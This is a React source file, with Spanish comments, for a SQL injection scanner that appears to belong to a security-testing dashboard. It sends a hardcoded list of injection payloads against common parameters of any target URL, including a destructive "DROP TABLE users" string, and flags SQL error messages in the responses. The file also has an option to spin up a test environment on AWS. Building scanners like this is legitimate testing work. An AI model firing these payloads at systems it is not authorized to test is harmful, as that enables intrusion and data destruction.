import React, { useState, useEffect } from 'react';
import { FaPlay, FaStop, FaSave, FaServer, FaDatabase } from 'react-icons/fa';
import Terminal from '../../common/Terminal';
import AWSConfigForm from '../../common/AWSConfigForm/AWSConfigForm';
import { 
    isAWSConnected, 
    getEC2Client, 
    createSQLTestEnvironment,
    getAWSCredentials
} from '../../../services/aws';
import { EC2Client, DescribeInstancesCommand } from "@aws-sdk/client-ec2";
import './SQLInjection.css';

const SQLInjection = () => {
    const [isAWSConfigured, setIsAWSConfigured] = useState(isAWSConnected());
    const [isScanning, setIsScanning] = useState(false);
    const [targetUrl, setTargetUrl] = useState('');
    const [scanType, setScanType] = useState('auto');
    const [instances, setInstances] = useState([]);
    const [selectedInstance, setSelectedInstance] = useState('');
    const [logs, setLogs] = useState([]);
    const [parameters, setParameters] = useState([{ name: '', value: '' }]);
    const [isCreatingEnvironment, setIsCreatingEnvironment] = useState(false);

    // Payloads comunes de SQL Injection
    const sqlPayloads = [
        "' OR '1'='1",
        "admin' --",
        "' UNION SELECT NULL--",
        "' UNION SELECT @@version--",
        "'; DROP TABLE users--",
        "' OR '1'='1' /*",
        "admin'/*",
        "' OR 1=1#",
        "') OR ('1'='1",
        "1' ORDER BY 1--",
    ];

    // Lista de parámetros comunes para probar automáticamente
    const commonParameters = [
        { name: 'id', value: '1' },
        { name: 'username', value: 'admin' },
        { name: 'password', value: '123456' },
        { name: 'search', value: 'test' },
        { name: 'query', value: 'products' },
        { name: 'category', value: 'all' },
        { name: 'user_id', value: '1' },
        { name: 'email', value: 'test@test.com' },
        { name: 'login', value: 'admin' },
        { name: 'page', value: '1' }
    ];

    useEffect(() => {
        if (isAWSConnected()) {
            loadEC2Instances();
        }
    }, []);

    const loadEC2Instances = async () => {
        try {
            // Verificar credenciales
            const credentials = getAWSCredentials();
            if (!credentials) {
                addLog('Error: No hay credenciales AWS configuradas', 'error');
                return;
            }

            // Crear cliente EC2 con las credenciales
            const ec2Client = new EC2Client({
                region: credentials.region || 'us-west-2',
                credentials: {
                    accessKeyId: credentials.accessKeyId,
                    secretAccessKey: credentials.secretAccessKey,
                    sessionToken: credentials.sessionToken
                }
            });

            const command = new DescribeInstancesCommand({});
            const response = await ec2Client.send(command);
            
            const instanceList = response.Reservations
                .flatMap(reservation => reservation.Instances)
                .map(instance => ({
                    id: instance.InstanceId,
                    ip: instance.PublicIpAddress || instance.PrivateIpAddress,
                    name: instance.Tags?.find(tag => tag.Key === 'Name')?.Value || instance.InstanceId
                }))
                .filter(instance => instance.ip);

            setInstances(instanceList);
            addLog(`${instanceList.length} instancias EC2 encontradas`, 'info');
        } catch (error) {
            addLog(`Error al cargar instancias EC2: ${error.message}`, 'error');
        }
    };

    const addLog = (message, type = 'info') => {
        setLogs(prev => [...prev, {
            message,
            type,
            timestamp: new Date().toISOString()
        }]);
    };

    const handleStartScan = async () => {
        if (!targetUrl) {
            addLog('Por favor, ingresa una URL objetivo', 'error');
            return;
        }

        setIsScanning(true);
        addLog(`Iniciando escaneo de SQL Injection en ${targetUrl}`, 'info');

        try {
            const paramsToTest = scanType === 'auto' ? commonParameters : parameters;
            
            for (const param of paramsToTest) {
                addLog(`Probando parámetro: ${param.name}`, 'info');
                
                for (const payload of sqlPayloads) {
                    if (!isScanning) break;

                    addLog(`Probando payload: ${payload}`, 'info');
                    
                    try {
                        const testUrl = new URL(targetUrl);
                        testUrl.searchParams.append(param.name, param.value + payload);

                        const response = await fetch(testUrl.toString());
                        const text = await response.text();
                        
                        try {
                            // Intentar parsear como JSON
                            const jsonResponse = JSON.parse(text);
                            
                            // Verificar si la consulta SQL es visible en la respuesta
                            if (jsonResponse.message && jsonResponse.message.includes("SELECT") && 
                                jsonResponse.message.includes(payload)) {
                                addLog(`¡Vulnerabilidad encontrada! La consulta SQL es visible en la respuesta`, 'error');
                                addLog(`Query inyectada: ${jsonResponse.message}`, 'error');
                            }
                        } catch (e) {
                            // Si no es JSON, buscar otros indicadores
                            const vulnerabilityIndicators = [
                                'error in your SQL syntax',
                                'mysql_fetch_array()',
                                'ORA-01756',
                                'SQLSTATE[',
                                'PostgreSQL ERROR',
                                'SQLite/JDBCDriver',
                                'System.Data.SQLClient',
                                'Microsoft OLE DB Provider for SQL Server',
                                'Warning: mysql_'
                            ];

                            if (vulnerabilityIndicators.some(indicator => text.includes(indicator))) {
                                addLog(`¡Vulnerabilidad encontrada! Error SQL detectado`, 'error');
                                addLog(`Payload usado: ${payload}`, 'error');
                            }
                        }

                    } catch (error) {
                        addLog(`Error al probar ${param.name}: ${error.message}`, 'warning');
                    }

                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }

            addLog('Escaneo completado', 'success');
        } catch (error) {
            addLog(`Error durante el escaneo: ${error.message}`, 'error');
        } finally {
            setIsScanning(false);
        }
    };

    const handleStopScan = () => {
        setIsScanning(false);
        addLog('Escaneo detenido por el usuario', 'warning');
    };

    const handleSaveReport = () => {
        const report = logs.map(log => 
            `[${new Date(log.timestamp).toLocaleTimeString()}] ${log.message}`
        ).join('\n');

        const blob = new Blob([report], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `sql-injection-report-${new Date().toISOString()}.txt`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    };

    const handleCreateTestEnvironment = async () => {
        try {
            if (!isAWSConnected()) {
                addLog('Error: No hay conexión con AWS. Por favor, configura tus credenciales primero.', 'error');
                return;
            }

            setIsCreatingEnvironment(true);
            addLog('Creando entorno de prueba...', 'info');

            const environment = await createSQLTestEnvironment();
            
            setTargetUrl(environment.url);
            addLog(`Entorno de prueba creado exitosamente!`, 'success');
            addLog(`URL de prueba: ${environment.url}`, 'info');
            addLog(`IP de la instancia: ${environment.ip}`, 'info');
            addLog('El entorno estará listo en aproximadamente 3-4 minutos...', 'info');
            addLog('Por favor, espera antes de intentar acceder a la URL', 'warning');

        } catch (error) {
            addLog(`Error al crear entorno de prueba: ${error.message}`, 'error');
        } finally {
            setIsCreatingEnvironment(false);
        }
    };

    if (!isAWSConfigured) {
        return <AWSConfigForm />;
    }

    return (
        <div className="tool-container">
            <div className="tool-header">
                <h2>SQL Injection Scanner</h2>
                <div className="scan-mode-selector">
                    <button 
                        className={`mode-button ${scanType === 'auto' ? 'active' : ''}`}
                        onClick={() => setScanType('auto')}
                    >
                        <FaDatabase /> Modo Automático
                    </button>
                    <button 
                        className={`mode-button ${scanType === 'manual' ? 'active' : ''}`}
                        onClick={() => setScanType('manual')}
                    >
                        <FaDatabase /> Modo Manual
                    </button>
                </div>
            </div>

            <div className="tool-content">
                <div className="config-panel">
                    <div className="environment-controls">
                        <button
                            onClick={handleCreateTestEnvironment}
                            disabled={isCreatingEnvironment}
                            className="create-env-btn"
                        >
                            {isCreatingEnvironment ? (
                                <>Creando entorno...</>
                            ) : (
                                <>🚀 Crear Entorno de Prueba</>
                            )}
                        </button>
                    </div>
                    {scanType === 'aws' ? (
                        <div className="form-group">
                            <label>Instancia EC2:</label>
                            <select
                                value={selectedInstance}
                                onChange={(e) => {
                                    const instance = instances.find(i => i.id === e.target.value);
                                    setSelectedInstance(e.target.value);
                                    setTargetUrl(`http://${instance?.ip}`);
                                }}
                                className="instance-select"
                            >
                                <option value="">Selecciona una instancia</option>
                                {instances.map(instance => (
                                    <option key={instance.id} value={instance.id}>
                                        {instance.name} ({instance.ip})
                                    </option>
                                ))}
                            </select>
                        </div>
                    ) : (
                        <div className="form-group">
                            <label>URL Objetivo:</label>
                            <input
                                type="url"
                                value={targetUrl}
                                onChange={(e) => setTargetUrl(e.target.value)}
                                placeholder="https://ejemplo.com/page.php"
                            />
                            <small className="help-text">
                                * Ingresa la URL base de la aplicación a escanear
                            </small>
                        </div>
                    )}

                    {scanType === 'manual' && (
                        <div className="parameters-section">
                            <label>Parámetros:</label>
                            {parameters.map((param, index) => (
                                <div key={index} className="parameter-row">
                                    <input
                                        type="text"
                                        placeholder="Nombre"
                                        value={param.name}
                                        onChange={(e) => {
                                            const newParams = [...parameters];
                                            newParams[index].name = e.target.value;
                                            setParameters(newParams);
                                        }}
                                    />
                                    <input
                                        type="text"
                                        placeholder="Valor"
                                        value={param.value}
                                        onChange={(e) => {
                                            const newParams = [...parameters];
                                            newParams[index].value = e.target.value;
                                            setParameters(newParams);
                                        }}
                                    />
                                    <button
                                        onClick={() => {
                                            const newParams = parameters.filter((_, i) => i !== index);
                                            setParameters(newParams);
                                        }}
                                        className="remove-param-btn"
                                    >
                                        ×
                                    </button>
                                </div>
                            ))}
                            <button
                                onClick={() => setParameters([...parameters, { name: '', value: '' }])}
                                className="add-param-btn"
                            >
                                + Añadir Parámetro
                            </button>
                        </div>
                    )}
                </div>

                <div className="action-buttons">
                    <button
                        onClick={handleStartScan}
                        disabled={isScanning}
                        className="start-button"
                    >
                        <FaPlay /> Iniciar Escaneo
                    </button>
                    <button
                        onClick={handleStopScan}
                        disabled={!isScanning}
                        className="stop-button"
                    >
                        <FaStop /> Detener
                    </button>
                    <button
                        onClick={handleSaveReport}
                        disabled={logs.length === 0}
                        className="save-button"
                    >
                        <FaSave /> Guardar Reporte
                    </button>
                </div>

                <Terminal logs={logs} />
            </div>
        </div>
    );
};

export default SQLInjection; 